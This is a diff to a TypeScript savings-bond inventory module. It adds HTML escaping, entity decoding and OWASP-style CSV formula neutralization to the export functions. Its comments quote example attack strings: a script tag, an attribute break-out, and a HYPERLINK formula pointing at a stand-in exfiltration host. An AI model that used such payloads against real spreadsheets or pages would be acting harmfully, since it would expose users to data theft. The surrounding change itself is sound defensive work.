@@ -1,6 +1,75 @@
 import { Bond } from '../types';
 
 /**
+ * Escape user-controlled strings for safe interpolation into HTML text
+ * content OR attribute values. Covers the five characters that can
+ * break out of either context (`&`, `<`, `>`, `"`, `'`).
+ *
+ * Always wrap ANY bond field (especially `note`, which the user types
+ * directly) in this before templating it into HTML — see
+ * `generateTreasuryHTML`. Without it, a note of
+ * `<script>alert(1)</script>` will execute when the exported inventory
+ * file is opened in any browser.
+ */
+function escapeHTML(s: string | number): string {
+  return String(s)
+    .replace(/&/g, '&amp;') // & first — otherwise we'd double-escape later steps
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+/**
+ * Inverse of `escapeHTML` for the hidden-input fallback parser.
+ * TreasuryDirect's saveable HTML stores display strings already
+ * entity-encoded, so we decode them back to their raw text. Combined
+ * with `escapeHTML` on export, this gives us a clean round-trip without
+ * silently turning legitimate `<` / `>` / `&` characters in serials
+ * and notes into `&lt;` / `&gt;` / `&amp;`.
+ *
+ * Note: the `&amp;` replacement runs LAST so we don't double-decode.
+ */
+function unescapeHTML(s: string): string {
+  return s
+    .replace(/&#39;/g, "'")
+    .replace(/&quot;/g, '"')
+    .replace(/&gt;/g, '>')
+    .replace(/&lt;/g, '<')
+    .replace(/&amp;/g, '&'); // & last
+}
+
+/**
+ * Prefix CSV cell values that start with a formula trigger (one of
+ * `=`, `+`, `-`, `@`, TAB, CR) with a single quote so spreadsheet apps
+ * (Excel, LibreOffice, Numbers) interpret the cell as literal text
+ * rather than executing the payload.
+ *
+ * Standard OWASP defense against CSV-injection / formula-injection.
+ * Protects users who export their portfolio then open the CSV in a
+ * spreadsheet that auto-executes formulas — without this, a note of
+ * `=HYPERLINK("https://evil.com/?exfil", "Open me")` becomes a
+ * clickable exfiltration link the moment the file is opened.
+ */
+function neutralizeCSVFormula(s: string): string {
+  if (/^[=+\-@\t\r]/.test(s)) return "'" + s;
+  return s;
+}
+
+/**
+ * Reference date used by every "as of today" computation in the app
+ * (the dashboard's maturity comparisons in App.tsx, and `isBondMatured`'s
+ * default reference when called without explicit args).
+ *
+ * Centralized in one place so a future bump can flip the whole dashboard
+ * at once, and so tests can pin a deterministic reference without
+ * freezing "now" globally (`new Date()` would be TZ-sensitive and shift
+ * across month rollover). `{ year, month }` is also the shape
+ * `isBondMatured(b.finalMaturity, year, month)` expects.
+ */
+export const CURRENT_REFERENCE_DATE = { year: 2026, month: 7 };
+
+/**
  * Decodes the Treasury month value (e.g., 745) to "MM/YYYY" format.
  * Base: May 2003 = 745
  */
@@ -131,20 +200,24 @@ export function parseBondsFromHTML(htmlText: string): Bond[] {
         const issueDate = decodeTreasuryMonth(parseInt(issueDates[i], 10));
         const nextAccrual = decodeTreasuryMonth(parseInt(nextAccruals[i], 10));
         const finalMaturity = decodeTreasuryMonth(parseInt(maturities[i], 10));
-        const note = notes[i] === " " ? "" : (notes[i] || "");
-        
+        const rawNote = notes[i] === " " ? "" : (notes[i] || "");
+
+        // Round-trip with escapeHTML on export: hidden-input payload is
+        // entity-encoded, so decode on import to recover the original
+        // raw text the user typed (otherwise a serial like `C827&EE`
+        // comes back as `C827&amp;EE` in the UI).
         bonds.push({
-          serial,
-          series: ser,
+          serial: unescapeHTML(serial),
+          series: unescapeHTML(ser) as 'I' | 'EE',
           denomination: denom,
-          issueDate,
-          nextAccrual,
-          finalMaturity,
+          issueDate: unescapeHTML(issueDate),
+          nextAccrual: unescapeHTML(nextAccrual),
+          finalMaturity: unescapeHTML(finalMaturity),
           issuePrice: price,
           interest: intr,
           interestRate: rate,
           value: val,
-          note
+          note: unescapeHTML(rawNote),
         });
       }
     }
@@ -167,10 +240,16 @@ function extractHiddenValue(html: string, name: string): string {
 export function generateTreasuryHTML(bonds: Bond[]): string {
   // To match Treasury Direct perfectly, we can convert dates to their encoded numbers
   // Note: the original HTML displays the table row in standard order (or reverse, we can preserve standard).
-  // Semicolon-separated lists:
-  const serials = bonds.map(b => b.serial).join(';') + ';';
+  //
+  // SECURITY: every user-controlled string (serial, series, note, dates)
+  // is passed through `escapeHTML` before being joined into semicolon-
+  // delimited lists or table cell bodies. Without this, a note of
+  // `<script>...</script>` or `"; onclick=...` would either execute
+  // when the file is opened in a browser or break out of the hidden
+  // input's value="..." attribute.
+  const serials = bonds.map(b => escapeHTML(b.serial)).join(';') + ';';
   const issueDates = bonds.map(b => encodeTreasuryMonth(b.issueDate)).join(';') + ';';
-  const series = bonds.map(b => b.series).join(';') + ';';
+  const series = bonds.map(b => escapeHTML(b.series)).join(';') + ';';
   const denoms = bonds.map(b => b.denomination).join(';') + ';';
   const issuePrices = bonds.map(b => b.issuePrice.toFixed(2)).join(';') + ';';
   const interests = bonds.map(b => b.interest.toFixed(2)).join(';') + ';';
@@ -179,7 +258,7 @@ export function generateTreasuryHTML(bonds: Bond[]): string {
   const rates = bonds.map(b => b.interestRate.toFixed(2)).join(';') + ';';
   const nextAccruals = bonds.map(b => encodeTreasuryMonth(b.nextAccrual)).join(';') + ';';
   const maturities = bonds.map(b => encodeTreasuryMonth(b.finalMaturity)).join(';') + ';';
-  const notes = bonds.map(b => b.note ? b.note : ' ').join(';') + ';';
+  const notes = bonds.map(b => b.note ? escapeHTML(b.note) : ' ').join(';') + ';';
 
   const totalPrice = bonds.reduce((sum, b) => sum + b.issuePrice, 0);
   const totalValue = bonds.reduce((sum, b) => sum + b.value, 0);
@@ -188,17 +267,17 @@ export function generateTreasuryHTML(bonds: Bond[]): string {
   let rowsHtml = '';
   bonds.forEach(b => {
     rowsHtml += `<tr>
-<td>${b.serial}</td>
-<td class="c1">${b.series}</td>
-<td>$${b.denomination}</td>
-<td>${b.issueDate}</td>
-<td>${b.nextAccrual}</td>
-<td>${b.finalMaturity}</td>
-<td>$${b.issuePrice.toFixed(2)}</td>
-<td>$${b.interest.toFixed(2)}</td>
-<td>${b.interestRate.toFixed(2)}%</td>
-<td class="ttl">$${b.value.toFixed(2)}</td>
-<td class="c1">${b.note ? b.note : '&nbsp;'}</td>
+<td>${escapeHTML(b.serial)}</td>
+<td class="c1">${escapeHTML(b.series)}</td>
+<td>$${escapeHTML(b.denomination)}</td>
+<td>${escapeHTML(b.issueDate)}</td>
+<td>${escapeHTML(b.nextAccrual)}</td>
+<td>${escapeHTML(b.finalMaturity)}</td>
+<td>$${escapeHTML(b.issuePrice.toFixed(2))}</td>
+<td>$${escapeHTML(b.interest.toFixed(2))}</td>
+<td>${escapeHTML(b.interestRate.toFixed(2))}%</td>
+<td class="ttl">$${escapeHTML(b.value.toFixed(2))}</td>
+<td class="c1">${b.note ? escapeHTML(b.note) : '&nbsp;'}</td>
 </tr>\n`;
   });
 
@@ -369,18 +448,22 @@ export function generateCSV(bonds: Bond[]): string {
     'Final Maturity', 'Issue Price', 'Interest', 'Interest Rate', 'Value', 'Note'
   ];
   
+  // SECURITY: every text cell passes through `neutralizeCSVFormula`
+  // so spreadsheet apps don't auto-execute a payload that starts with
+  // a formula trigger (=, +, -, @, TAB, CR). Numeric cells are safe
+  // by construction — they can't start with a formula character.
   const rows = bonds.map(b => [
-    `"${b.serial}"`,
-    `"${b.series}"`,
+    `"${neutralizeCSVFormula(b.serial)}"`,
+    `"${neutralizeCSVFormula(b.series)}"`,
     b.denomination,
-    `"${b.issueDate}"`,
-    `"${b.nextAccrual}"`,
-    `"${b.finalMaturity}"`,
+    `"${neutralizeCSVFormula(b.issueDate)}"`,
+    `"${neutralizeCSVFormula(b.nextAccrual)}"`,
+    `"${neutralizeCSVFormula(b.finalMaturity)}"`,
     b.issuePrice,
     b.interest,
     b.interestRate,
     b.value,
-    `"${b.note.replace(/"/g, '""')}"`
+    `"${neutralizeCSVFormula(b.note.replace(/"/g, '""'))}"`,
   ]);
   
   return [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
@@ -391,7 +474,15 @@ export function generateCSV(bonds: Bond[]): string {
  * Simple check: if Final Maturity is prior to or equal to current date.
  * We can parse MM/YYYY and compare to check.
  */
-export function isBondMatured(maturityStr: string, currentYear = 2026, currentMonth = 7): boolean {
+export function isBondMatured(
+  maturityStr: string,
+  // Default to the centralized reference date; App.tsx callers
+  // currently pass `CURRENT_REFERENCE_DATE` explicitly to keep the
+  // dashboard deterministic across sessions and timezones, but any
+  // future caller that omits these will still get a sensible value.
+  currentYear: number = CURRENT_REFERENCE_DATE.year,
+  currentMonth: number = CURRENT_REFERENCE_DATE.month,
+): boolean {
   if (!maturityStr) return false;
   const parts = maturityStr.split('/');
   if (parts.length !== 2) return false;
